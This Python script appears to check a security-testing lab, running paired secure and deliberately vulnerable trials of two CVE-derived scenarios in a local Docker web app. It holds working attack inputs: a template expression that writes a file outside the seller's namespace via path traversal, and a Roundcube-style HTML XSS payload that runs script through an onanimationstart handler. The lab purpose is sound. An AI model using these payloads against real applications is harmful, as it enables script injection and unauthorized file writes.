from __future__ import annotations

import argparse
import hashlib
import json
import os
import subprocess
import time
from pathlib import Path
from uuid import uuid4

import httpx
from playwright.sync_api import sync_playwright


APP_ROOT = Path(__file__).resolve().parents[1]
EVENT_SCHEMA_PATH = APP_ROOT.parent / "contracts" / "verifier-ledger-event.schema.json"
PUBLIC_ORIGIN = "http://127.0.0.1:18080"
CONTROL_ORIGIN = "http://127.0.0.1:18081"
RESET_HEADERS = {"X-Ruby-Reset-Token": "development-reset-only"}
SEED_PASSWORD = "RUBY-Development-Only-2026!"
# 관리자는 시나리오가 공격자에게 건네는 계정이 아니다. 나머지 계정과 같은
# 비밀번호를 쓰면 건네준 자격증명 하나로 관리자 세션이 열린다.
SEED_ADMIN_PASSWORD = "RUBY-Operations-Only-2026!"
def seed_password(email: str) -> str:
    return (
        SEED_ADMIN_PASSWORD
        if email.strip().lower() == "admin@ruby.local"
        else SEED_PASSWORD
    )

CHROME_PATH = Path(r"C:\Program Files\Google\Chrome\Application\chrome.exe")
SUPPORT_ID = "00000000-0000-4000-8000-000000000003"
SELLER_ID = "00000000-0000-4000-8000-000000000002"
XSS_MARKER = "RUBY-ROUNDCUBE-DERIVED-SUCCESS"


def canonical_json(value: object) -> str:
    return json.dumps(value, ensure_ascii=False, sort_keys=True, separators=(",", ":"))


def digest_bytes(value: bytes) -> str:
    return "sha256:" + hashlib.sha256(value).hexdigest()


def digest(value: object) -> str:
    return digest_bytes(canonical_json(value).encode())


def compose(
    *arguments: str, environment: dict[str, str] | None = None
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", *arguments],
        cwd=APP_ROOT,
        env=environment,
        check=True,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="strict",
        timeout=240,
    )


def configure_api(*, trial_id: str, module_id: str | None) -> None:
    environment = os.environ.copy()
    environment["RUBY_WEB_TRIAL_ID"] = trial_id
    environment["RUBY_WEB_VULNERABILITY_MODULES"] = module_id or ""
    compose("up", "-d", "--no-deps", "--force-recreate", "api", environment=environment)
    deadline = time.monotonic() + 90
    while time.monotonic() < deadline:
        try:
            if httpx.get(f"{CONTROL_ORIGIN}/health/live", timeout=2).status_code == 200:
                return
        except httpx.HTTPError:
            pass
        time.sleep(1)
    raise RuntimeError("API recreation did not become healthy")


def reset() -> None:
    httpx.post(
        f"{CONTROL_ORIGIN}/internal/reset", headers=RESET_HEADERS, timeout=20
    ).raise_for_status()


def login(client: httpx.Client, email: str) -> tuple[str, str]:
    response = client.post(
        "/api/auth/login", json={"email": email, "password": seed_password(email)}
    )
    response.raise_for_status()
    payload = response.json()
    return payload["token"], payload["user"]["id"]


def bearer(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def running_image_digest(service: str) -> str:
    container_id = compose("ps", "-q", service).stdout.strip()
    result = subprocess.run(
        ["docker", "inspect", container_id, "--format", "{{.Image}}"],
        check=True,
        capture_output=True,
        text=True,
        encoding="utf-8",
    )
    return result.stdout.strip()


def compose_exec(service: str, code: str, *arguments: str) -> str:
    return compose("exec", "-T", service, "python", "-c", code, *arguments).stdout.strip()


def register_victim(user_id: str) -> None:
    """Tell the control plane whose session is the victim in this trial.

    The application records a browser effect only for a session it was told to
    treat as a victim, so the attacker cannot drive its own session into a
    success. The checker announces the victim the same way the campaign
    harness does.
    """
    httpx.post(
        f"{CONTROL_ORIGIN}/internal/victim",
        json={"user_id": user_id},
        headers=RESET_HEADERS,
        timeout=20,
    ).raise_for_status()


def verifier(
    *,
    scenario_id: str,
    effect_type: str,
    event_type: str,
    protected_key: str,
    subject: dict[str, str],
    object_: dict[str, str],
    deduplication_key: str,
) -> tuple[str, dict[str, object]]:
    predicate_id = scenario_id + ".effect"
    condition = {
        "deduplication_key": deduplication_key,
        "event_type": event_type,
        "minimum_occurrences": 1,
        "object": object_,
        "protected_resource_key": protected_key,
        "subject": subject,
        "window_seconds": 300,
    }
    return predicate_id, {
        "contract_version": 1,
        "scenario_id": scenario_id,
        "verifier_image_digest": running_image_digest("evaluator"),
        "event_schema_digest": digest_bytes(EVENT_SCHEMA_PATH.read_bytes()),
        "network_access": "control-only",
        "attacker_visible": False,
        "predicates": [
            {
                "predicate_id": predicate_id,
                "effect_type": effect_type,
                "event_type": event_type,
                "subject_selector": canonical_json(subject),
                "object_selector": canonical_json(object_),
                "protected_resource_key": protected_key,
                "condition_digest": digest(condition),
                "window_seconds": 300,
                "minimum_occurrences": 1,
                "deduplication_key": deduplication_key,
            }
        ],
    }


def evaluate(
    trial_id: str, predicate_id: str, manifest: dict[str, object]
) -> dict[str, object]:
    payload = canonical_json(
        {"trial_id": trial_id, "predicate_id": predicate_id, "verifier": manifest}
    )
    code = (
        "import os,sys,urllib.request;"
        "r=urllib.request.Request('http://127.0.0.1:8000/internal/evaluate',"
        "data=sys.argv[1].encode(),headers={'Content-Type':'application/json',"
        "'X-Ruby-Evaluator-Token':os.environ['RUBY_EVALUATOR_TOKEN']});"
        "print(urllib.request.urlopen(r).read().decode())"
    )
    return json.loads(compose_exec("evaluator", code, payload))


def run_template_condition(vulnerable: bool) -> dict[str, object]:
    module = "geoserver-derived.seller-template-expression"
    trial_id = uuid4().hex
    configure_api(trial_id=trial_id, module_id=module if vulnerable else None)
    reset()
    # 판매자 이름공간 밖으로 나가는 문서 이름이 이 시나리오의 위반이다.
    document_name = "../shared/derived-command.txt"
    document_key = f"template-documents/{trial_id}/shared/derived-command.txt"
    expression = (
        "${document.attach('../shared/derived-command.txt','controlled effect')}"
    )
    with httpx.Client(base_url=PUBLIC_ORIGIN, timeout=20) as client:
        token, actor_id = login(client, "seller@ruby.local")
        normal = client.post(
            "/api/seller/templates/preview",
            headers=bearer(token),
            json={"product_id": "ruby-camera", "expression": "${product.name}"},
        )
        attack = client.post(
            "/api/seller/templates/preview",
            headers=bearer(token),
            json={"product_id": "ruby-camera", "expression": expression},
        )
        repeated = client.post(
            "/api/seller/templates/preview",
            headers=bearer(token),
            json={"product_id": "ruby-camera", "expression": expression},
        )
    subject = {"actor_id": actor_id, "authorized": "false", "role": "seller_staff"}
    object_ = {"resource_id": document_key, "product_id": "ruby-camera"}
    deduplication_key = (
        f"template-xns-write:{actor_id}:"
        f"{hashlib.sha256(document_key.encode()).hexdigest()}"
    )
    predicate_id, manifest = verifier(
        scenario_id="geoserver-derived-seller-template-expression",
        effect_type="unauthorized-resource-write",
        event_type="resource.write",
        protected_key="template.cross-namespace-document",
        subject=subject,
        object_=object_,
        deduplication_key=deduplication_key,
    )
    result = evaluate(trial_id, predicate_id, manifest)
    expected = vulnerable
    checks = {
        "normal_field_expression_works": normal.status_code == 200
        and normal.json().get("rendered") == "RUBY Web Camera",
        "command_status_matches_condition": attack.status_code == (200 if expected else 422),
        "repeat_status_matches_condition": repeated.status_code == (200 if expected else 422),
        "response_artifact_matches_condition": (
            attack.json().get("generated_document") == document_name
            if expected
            else attack.json().get("detail") == "document name is invalid"
        ),
        "private_evaluator_matches_condition": result["objective_achieved"] is expected,
        "event_is_deduplicated": len(result["matched_event_ids"]) == (1 if expected else 0),
    }
    return {
        "scenario_id": "seller-template-expression",
        "module_id": module,
        "condition": "vulnerable" if vulnerable else "secure",
        "trial_id": trial_id,
        "actor_id": actor_id,
        "http_status": attack.status_code,
        "response_evidence": attack.json(),
        "evaluator": result,
        "verifier_digest": digest(manifest),
        "checks": checks,
        "passed": all(checks.values()),
    }


def browser_open(token: str, path: str) -> dict[str, object]:
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(
            executable_path=str(CHROME_PATH), headless=True, args=["--disable-gpu"]
        )
        context = browser.new_context(
            extra_http_headers={"Authorization": f"Bearer {token}"}
        )
        page = context.new_page()
        response = page.goto(
            PUBLIC_ORIGIN + path, wait_until="domcontentloaded", timeout=30_000
        )
        page.wait_for_timeout(1_000)
        result = {
            "http_status": response.status if response is not None else None,
            "title": page.title(),
            "ticket_text_visible": page.get_by_text("Ticket details", exact=True).count() == 1,
            "marker_executed": page.title() == XSS_MARKER,
        }
        context.close()
        browser.close()
        return result


def run_html_condition(vulnerable: bool) -> dict[str, object]:
    module = "roundcube-derived.support-ticket-html-postprocess"
    trial_id = uuid4().hex
    configure_api(trial_id=trial_id, module_id=module if vulnerable else None)
    reset()
    payload = (
        '<body title="bgcolor=foo" name="bar style=animation-name:queue-sync '
        # 제목만 바꾸면 화면 밖으로 나오는 것이 없다. 스크립트가 낸 요청이
        # 있어야 앱이 실행을 관측한다. 실제 XSS 도 여기서부터 시작한다.
        f"onanimationstart=document.title='{XSS_MARKER}',"
        "fetch('/api/auth/remember-device',{method:'POST'}) foo=bar\">"
        "<p>Ticket details</p></body>"
    )
    with httpx.Client(base_url=PUBLIC_ORIGIN, timeout=20) as client:
        customer_token, _ = login(client, "customer@ruby.local")
        created = client.post(
            "/api/tickets",
            headers=bearer(customer_token),
            data={"subject": "HTML support request", "body": payload},
        )
        created.raise_for_status()
        ticket_id = created.json()["id"]
        support_token, actor_id = login(client, "support@ruby.local")
    register_victim(actor_id)
    first = browser_open(
        support_token, f"/api/support/tickets/{ticket_id}/html-preview"
    )
    second = browser_open(
        support_token, f"/api/support/tickets/{ticket_id}/html-preview"
    )
    # 사건은 앱이 적는다. 검사기는 아무것도 써 넣지 않는다.
    subject = {"actor_id": actor_id, "authorized": "false", "role": "support_staff"}
    object_ = {"resource_id": "ticket.browser-marker", "ticket_id": ticket_id}
    predicate_id, manifest = verifier(
        scenario_id="roundcube-derived-support-ticket-html-postprocess",
        effect_type="browser-code-execution",
        event_type="browser.code_executed",
        protected_key="ticket.browser-marker",
        subject=subject,
        object_=object_,
        deduplication_key=f"ticket-browser:{actor_id}:{ticket_id}",
    )
    result = evaluate(trial_id, predicate_id, manifest)
    expected = vulnerable
    checks = {
        "browser_http_status": first["http_status"] == 200 == second["http_status"],
        "ticket_body_rendered": first["ticket_text_visible"]
        and second["ticket_text_visible"],
        "browser_marker_matches_condition": first["marker_executed"] is expected
        and second["marker_executed"] is expected,
        "private_evaluator_matches_condition": result["objective_achieved"] is expected,
        "event_is_deduplicated": len(result["matched_event_ids"]) == (1 if expected else 0),
    }
    return {
        "scenario_id": "support-ticket-html-postprocess",
        "module_id": module,
        "condition": "vulnerable" if vulnerable else "secure",
        "trial_id": trial_id,
        "actor_id": actor_id,
        "ticket_id": ticket_id,
        "browser_first": first,
        "browser_second": second,
        "evaluator": result,
        "verifier_digest": digest(manifest),
        "checks": checks,
        "passed": all(checks.values()),
    }


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Check both Stage 3A CVE-derived pairs")
    parser.add_argument("--output-dir", type=Path, required=True)
    parser.add_argument("--run-id", required=True)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.output_dir.exists():
        raise FileExistsError(f"refusing to overwrite output: {args.output_dir}")
    if not CHROME_PATH.is_file():
        raise RuntimeError(f"Chrome is unavailable: {CHROME_PATH}")
    httpx.get(f"{CONTROL_ORIGIN}/health/live", timeout=5).raise_for_status()
    args.output_dir.mkdir(parents=True, exist_ok=False)
    results: list[dict[str, object]] = []
    failure: str | None = None
    try:
        for exercise in (run_template_condition, run_html_condition):
            for vulnerable in (False, True):
                result = exercise(vulnerable)
                results.append(result)
                if not result["passed"]:
                    failure = (
                        f"pair failed: {result['scenario_id']} {result['condition']}"
                    )
                    break
            if failure is not None:
                break
    except Exception as error:
        failure = f"{type(error).__name__}: {error}"
    finally:
        try:
            configure_api(trial_id="", module_id=None)
            reset()
        except Exception as error:
            failure = (failure + "; " if failure else "") + f"restore failed: {error}"
    report = {
        "schema_version": 1,
        "run_id": args.run_id,
        "status": "passed" if failure is None and len(results) == 4 else "failed",
        "expected_conditions": 4,
        "completed_conditions": len(results),
        "results": results,
        "failure": failure,
        "restored_profile": "secure",
    }
    report_path = args.output_dir / "stage3a-derived-pair-report.json"
    report_path.write_text(
        json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    print(
        canonical_json(
            {
                "report": str(report_path),
                "report_sha256": digest_bytes(report_path.read_bytes()),
                "status": report["status"],
                "completed_conditions": len(results),
            }
        )
    )
    return 0 if report["status"] == "passed" else 2


if __name__ == "__main__":
    raise SystemExit(main())
